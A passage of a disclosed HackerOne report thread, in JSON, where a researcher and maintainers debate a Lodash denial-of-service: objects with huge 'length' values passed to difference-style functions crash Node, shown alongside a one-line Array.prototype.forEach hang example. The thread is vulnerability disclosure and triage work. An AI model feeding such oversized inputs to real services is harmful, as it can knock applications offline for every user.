was thinking that Lodash was the vulnerable component and that Node.js was the affected component, but maybe they are considered one of the same in this context","markdown_message":"\u003cp\u003eI was thinking that Lodash was the vulnerable component and that Node.js was the affected component, but maybe they are considered one of the same in this context\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-04T14:25:29.952Z","updated_at":"2019-10-04T14:25:29.952Z","actor":{"username":"spengietz","cleared":false,"url":"/spengietz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5959804,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"if that was the case then vulnerable component would never be equal to impacted component. The vulnerability lies in the lodash library which puts the browser or the Node.js server as a vulnerable component as they are using it. ","markdown_message":"\u003cp\u003eif that was the case then vulnerable component would never be equal to impacted component. The vulnerability lies in the lodash library which puts the browser or the Node.js server as a vulnerable component as they are using it. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-04T14:34:33.112Z","updated_at":"2019-10-04T14:34:33.112Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5960510,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Oh alright that makes sense, then I think your analysis is accurate","markdown_message":"\u003cp\u003eOh alright that makes sense, then I think your analysis is accurate\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-04T16:07:14.803Z","updated_at":"2019-10-04T16:07:14.803Z","actor":{"username":"spengietz","cleared":false,"url":"/spengietz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5962264,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great, thanks for confirming.\n\n@jdalton let us know if you need any help with resolving the issue.\n@spengietz any chance you can help out John with figuring out other places that this occurs in the codebase?\n","markdown_message":"\u003cp\u003eGreat, thanks for confirming.\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/jdalton\"\u003e@jdalton\u003c/a\u003e let us know if you need any help with resolving the issue.\u003cbr\u003e\n\u003ca href=\"/spengietz\"\u003e@spengietz\u003c/a\u003e any chance you can help out John with figuring out other places that this occurs in the codebase?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-04T20:11:27.604Z","updated_at":"2019-10-04T20:11:27.604Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5962756,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Just did a quick search in the lodash.js file (https://github.com/lodash/lodash/blob/4.17.15/lodash.js) to see what functions are relying on \"baseDifference\". Not sure if it might be imported and used elsewhere in the code though.\n\nThe functions that use baseDifference within lodash.js are here:\n- difference\n- differenceBy\n- differenceWith\n- baseXor\n- without\n\nNot sure about the exploitability if each of them, but possibly next week or next weekend I could look into that.","markdown_message":"\u003cp\u003eJust did a quick search in the lodash.js file (\u003ca title=\"https://github.com/lodash/lodash/blob/4.17.15/lodash.js\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Flodash%2Flodash%2Fblob%2F4.17.15%2Flodash.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/lodash/lodash/blob/4.17.15/lodash.js\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) to see what functions are relying on \u0026quot;baseDifference\u0026quot;. Not sure if it might be imported and used elsewhere in the code though.\u003c/p\u003e\n\n\u003cp\u003eThe functions that use baseDifference within lodash.js are here:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003edifference\u003c/li\u003e\n\u003cli\u003edifferenceBy\u003c/li\u003e\n\u003cli\u003edifferenceWith\u003c/li\u003e\n\u003cli\u003ebaseXor\u003c/li\u003e\n\u003cli\u003ewithout\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eNot sure about the exploitability if each of them, but possibly next week or next weekend I could look into that.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-04T21:07:23.002Z","updated_at":"2019-10-04T21:07:23.002Z","actor":{"username":"spengietz","cleared":false,"url":"/spengietz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5963420,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Several of our methods are \"Collections\" methods meaning they accept an array-like object (an object with a length counts too). Many builtin array methods can accept things like this too.\n```js\nArray.prototype.forEach.call({'length': 99999999999}, () =\u003e{}) // hang\n```\n\nMany bultin array methods tend to be `this` generic so they don't care that an object is not a real array either. I'm open to ideas to tackle it though.","markdown_message":"\u003cp\u003eSeveral of our methods are \u0026quot;Collections\u0026quot; methods meaning they accept an array-like object (an object with a length counts too). Many builtin array methods can accept things like this too.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nb\"\u003eArray\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eprototype\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eforEach\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecall\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003elength\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"mi\"\u003e99999999999\u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"p\"\u003e{})\u003c/span\u003e \u003cspan class=\"c1\"\u003e// hang\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eMany bultin array methods tend to be \u003ccode\u003ethis\u003c/code\u003e generic so they don\u0026#39;t care that an object is not a real array either. I\u0026#39;m open to ideas to tackle it though.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-05T01:42:34.864Z","updated_at":"2019-10-05T01:42:34.864Z","actor":{"username":"jdalton","cleared":false,"url":"/jdalton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/237/124/03f44e2935a9cb266645e0eef4065316affe0241_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5978700,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ah that's interesting, didn't realize that. This seems like a tough problem to tackle then and I haven't worked intimately with Node.js for a while now so I don't have many insights. I'll keep thinking on it though and see if I can do some research tonight into what a good direction to go would be.","markdown_message":"\u003cp\u003eAh that\u0026#39;s interesting, didn\u0026#39;t realize that. This seems like a tough problem to tackle then and I haven\u0026#39;t worked intimately with Node.js for a while now so I don\u0026#39;t have many insights. I\u0026#39;ll keep thinking on it though and see if I can do some research tonight into what a good direction to go would be.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-07T16:41:01.618Z","updated_at":"2019-10-07T16:41:01.618Z","actor":{"username":"spengietz","cleared":false,"url":"/spengietz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5985347,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jdalton I see your point about this being perhaps a generic enough issue that it could be thought of \"this is how it works in the language\", and surely enough we will not consider the Array forEach example you demonstrated as a vulnerability. However, a user may consider lodash's methods to not work in the same way, and they wouldn't have your depth of knowledge for this.\n\nWhat I think will be best here is to have a security disclaimer in lodash's documentation/repository which will make users aware of this security concern. WDYT?","markdown_message":"\u003cp\u003e\u003ca href=\"/jdalton\"\u003e@jdalton\u003c/a\u003e I see your point about this being perhaps a generic enough issue that it could be thought of \u0026quot;this is how it works in the language\u0026quot;, and surely enough we will not consider the Array forEach example you demonstrated as a vulnerability. However, a user may consider lodash\u0026#39;s methods to not work in the same way, and they wouldn\u0026#39;t have your depth of knowledge for this.\u003c/p\u003e\n\n\u003cp\u003eWhat I think will be best here is to have a security disclaimer in lodash\u0026#39;s documentation/repository which will make users aware of this security concern. WDYT?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-08T12:04:36.079Z","updated_at":"2019-10-08T12:04:36.079Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5987906,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Improved docs is always a win for me :) ","markdown_message":"\u003cp\u003eImproved docs is always a win for me :) \u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-08T16:50:22.982Z","updated_at":"2019-10-08T16:50:22.982Z","actor":{"username":"jdalton","cleared":false,"url":"/jdalton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/237/124/03f44e2935a9cb266645e0eef4065316affe0241_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5989005,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jdalton yay 🤗❤️\n@spengietz WDYT?\n","markdown_message":"\u003cp\u003e\u003ca href=\"/jdalton\"\u003e@jdalton\u003c/a\u003e yay 🤗❤️\u003cbr\u003e\n\u003ca href=\"/spengietz\"\u003e@spengietz\u003c/a\u003e WDYT?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-08T19:10:22.169Z","updated_at":"2019-10-08T19:10:22.169Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5989733,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I think that works.\n\nDo you know why the Array.prototype version above just hangs forever when the Lodash function actually crashes the node process? Not sure if that differentiates them, but it seems like a payload against Array.prototype would only affect the user who sent it, but an actual crash of the process would affect every user","markdown_message":"\u003cp\u003eI think that works.\u003c/p\u003e\n\n\u003cp\u003eDo you know why the Array.prototype version above just hangs forever when the Lodash function actually crashes the node process? Not sure if that differentiates them, but it seems like a payload against Array.prototype would only affect the user who sent it, but an actual crash of the process would affect every user\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-08T20:42:31.604Z","updated_at":"2019-10-08T20:42:31.604Z","actor":{"username":"spengietz","cleared":false,"url":"/spengietz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6026710,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jdalton ping me when you make an update to the README then and I'll close this issue?\n\n@spengietz I'm not entirely sure but I can assume that perhaps lodash just straight-up tries to allocate more data on the heap than it was allowed and so it crashed on OOM where-as the language Array construct does it different by perhaps trying to allocate when memory is available only and so it may hang but not crash. That's just a guess though, I haven't looked into the inner workings of either.","markdown_message":"\u003cp\u003e\u003ca href=\"/jdalton\"\u003e@jdalton\u003c/a\u003e ping me when you make an update to the README then and I\u0026#39;ll close this issue?\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/spengietz\"\u003e@spengietz\u003c/a\u003e I\u0026#39;m not entirely sure but I can assume that perhaps lodash just straight-up tries to allocate more data on the heap than it was allowed and so it crashed on OOM where-as the language Array construct does it different by perhaps trying to allocate when memory is available only and so it may hang but not crash. That\u0026#39;s just a guess though, I haven\u0026#39;t looked into the inner workings of either.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-13T10:05:28.381Z","updated_at":"2019-10-13T10:05:28.381Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6036399,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Given that, it seems like the two scenarios aren't very comparable then.\n\nIf I exploited the Array.prototype example above in a web application, it would just take a long time to respond to my request and not affect any other users (as far as I understand at least).\n\nIf I exploited the Lodash version that I reported, the entire server would crash and would deny access to every user of the application indefinitely.\n\nSeems like these aren't quite the same and maybe a documentation change is not quite enough. Perhaps I'm wrong on the impact, but it seems that in Lodash the impact is far greater than the built-in JS methods.","markdown_message":"\u003cp\u003eGiven that, it seems like the two scenarios aren\u0026#39;t very comparable then.\u003c/p\u003e\n\n\u003cp\u003eIf I exploited the Array.prototype example above in a web application, it would just take a long time to respond to my request and not affect any other users (as far as I understand at least).\u003c/p\u003e\n\n\u003cp\u003eIf I exploited the Lodash version that I reported, the entire server would crash and would deny access to every user of the application indefinitely.\u003c/p\u003e\n\n\u003cp\u003eSeems like these aren\u0026#39;t quite the same and maybe a documentation change is not quite enough. Perhaps I\u0026#39;m wrong on the impact, but it seems that in Lodash the impact is far greater than the built-in JS methods.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-14T16:58:30.935Z","updated_at":"2019-10-14T16:59:04.038Z","actor":{"username":"spengietz","cleared":false,"url":"/spengietz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6057237,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I wish I had more in-depth knowledge of Node.js internals to help come up with a better fix/solution, but I'm not sure I can.\n\nThis may not be applicable, but in Python the len() function provides the length of something, instead of relying on a .length attribute, so I wonder if there is some way to check in JavaScript if you're reading the value of the key \"length\" or if you're actually reading the length of the object/array.","markdown_message":"\u003cp\u003eI wish I had more in-depth knowledge of Node.js internals to help come up with a better fix/solution, but I\u0026#39;m not sure I can.\u003c/p\u003e\n\n\u003cp\u003eThis may not be applicable, but in Python the len() function provides the length of something, instead of relying on a .length attribute, so I wonder if there is some way to check in JavaScript if you\u0026#39;re reading the value of the key \u0026quot;length\u0026quot; or if you\u0026#39;re actually reading the length of the object/array.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-16T16:48:33.614Z","updated_at":"2019-10-16T16:48:33.614Z","actor":{"username":"spengietz","cleared":false,"url":"/spengietz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6058139,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@spengietz are we discussing the internal Node.js (or rather v8 actually) API and its security? if so that's a whole different context than this H1 program which is focused on npm ecosystem modules.\n\n@jdalton could lodash run some checks internally like checking hasOwnProperty or would that not matter? I guess even if you add it then it will be a breaking change for library consumers.","markdown_message":"\u003cp\u003e\u003ca href=\"/spengietz\"\u003e@spengietz\u003c/a\u003e are we discussing the internal Node.js (or rather v8 actually) API and its security? if so that\u0026#39;s a whole different context than this H1 program which is focused on npm ecosystem modules.\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/jdalton\"\u003e@jdalton\u003c/a\u003e could lodash run some checks internally like checking hasOwnProperty or would that not matter? I guess even if you add it then it will be a breaking change for library consumers.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-16T19:08:07.013Z","updated_at":"2019-10-16T19:08:07.013Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6058622,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I was just making the comparison because the impact of the v8 API versus the Lodash vuln I reported makes me think that additional documentation may not be enough to mitigate the risk that it presents, I just don't know exactly what a sufficient fix would look like in Lodash","markdown_message":"\u003cp\u003eI was just making the comparison because the impact of the v8 API versus the Lodash vuln I reported makes me think that additional documentation may not be enough to mitigate the risk that it presents, I just don\u0026#39;t know exactly what a sufficient fix would look like in Lodash\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-16T20:07:19.497Z","updated_at":"2019-10-16T20:07:19.497Z","actor":{"username":"spengietz","cleared":false,"url":"/spengietz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6143252,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I think that a documentation update is required regardless to ensure developers are aware of the security context. \n\n@spengietz I believe this vulnerability applies to consumers of lodash that may use this \"insecure\" compare function and may get tricked into passing arbitrary sizes via objects to the function call. I'm not yet entirely convinced this is a vulnerability per-the-docs in lodash as you could generally consider C's malloc(size) as vulnerable as well since you can pass a large enough size and crash an app. I do agree however that a security disclaimer needs to be added by @jdalton to ensure developers are aware of the potential security issue.","markdown_message":"\u003cp\u003eI think that a documentation update is required regardless to ensure developers are aware of the security context. \u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/spengietz\"\u003e@spengietz\u003c/a\u003e I believe this vulnerability applies to consumers of lodash that may use this \u0026quot;insecure\u0026quot; compare function and may get tricked into passing arbitrary sizes via objects to the function call. I\u0026#39;m not yet entirely convinced this is a vulnerability per-the-docs in lodash as you could generally consider C\u0026#39;s malloc(size) as vulnerable as well since you can pass a large enough size and crash an app. I do agree however that a security disclaimer needs to be added by \u003ca href=\"/jdalton\"\u003e@jdalton\u003c/a\u003e to ensure developers are aware of the potential security issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-26T08:40:52.713Z","updated_at":"2019-10-26T08:40:52.713Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6157697,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yeah that's a good point on malloc. It's not a vulnerability in the function, it's a vulnerability in incorrectly using the function.\n\nAlright I'm on board with that then!","markdown_message":"\u003cp\u003eYeah that\u0026#39;s a good point on malloc. It\u0026#39;s not a vulnerability in the function, it\u0026#39;s a vulnerability in incorrectly using the function.\u003c/p\u003e\n\n\u003cp\u003eAlright I\u0026#39;m on board with that then!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-28T18:59:09.302Z","updated_at":"2019-10-28T18:59:09.302Z","actor":{"username":"spengietz","cleared":false,"url":"/spengietz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6468650,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@spengietz I will close the issue as informative and disclose so we can retain the action items from this and make it available for lodash maintainers and community to follow-up with a PR for this later.","markdown_message":"\u003cp\u003e\u003ca href=\"/spengietz\"\u003e@spengietz\u003c/a\u003e I will close the issue as informative and disclose so we can retain the action items from this and make it available for lodash maintainers and community to follow-up with a PR for this later.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-04T19:48:00.164Z","updated_at":"2019-12-04T19:48:00.164Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6468653,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"A security disclaimer should be added to the project for developers to be aware","markdown_message":"\u003cp\u003eA security disclaimer should be added to the project for developers to be aware\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-04T19:48:35.565Z","updated_at":"2019-12-04T19:48:35.565Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6468655,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-04T19:48:56.428Z","updated_at":"2019-12-04T19:48:56.428Z","first_to_agree":true,"actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6468657,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-04T19:49:06.147Z","updated_at":"2019-12-04T19:49:06.147Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}